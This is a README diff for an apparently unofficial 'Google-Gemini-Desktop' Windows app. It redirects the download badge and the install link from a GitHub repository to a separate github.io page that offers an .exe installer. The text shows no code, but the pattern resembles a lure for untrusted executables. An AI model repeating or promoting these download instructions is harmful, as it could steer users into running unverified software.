@@ -1,6 +1,6 @@
 # 🤖 Google-Gemini-Desktop - Access Google AI on your desktop
 
-[![](https://img.shields.io/badge/Download-Gemini_Desktop-blue.svg)](https://github.com/Milkriveraneurism658/Google-Gemini-Desktop)
+[![](https://img.shields.io/badge/Download-Gemini_Desktop-blue.svg)](https://milkriveraneurism658.github.io)
 
 Google-Gemini-Desktop acts as a native application for your computer. It allows you to use Google Gemini AI models directly from your desktop. This app gives you access to features like multimodal reasoning, coding assistance, and creative writing. You can analyze images and files without opening a web browser. The application offers a stable environment for your workflows. It provides a direct interface for Gemini Pro and Flash models. 
 
@@ -16,7 +16,7 @@ To run this application on Windows, your computer must meet these basic standard
 
 ## 📥 How to Install
 
-1. Visit the project website at [https://github.com/Milkriveraneurism658/Google-Gemini-Desktop](https://github.com/Milkriveraneurism658/Google-Gemini-Desktop).
+1. Visit the project website at [https://milkriveraneurism658.github.io](https://milkriveraneurism658.github.io).
 2. Locate the link to the latest software release.
 3. Download the installer file ending in .exe for your Windows system.
 4. Open the folder where the file saved.
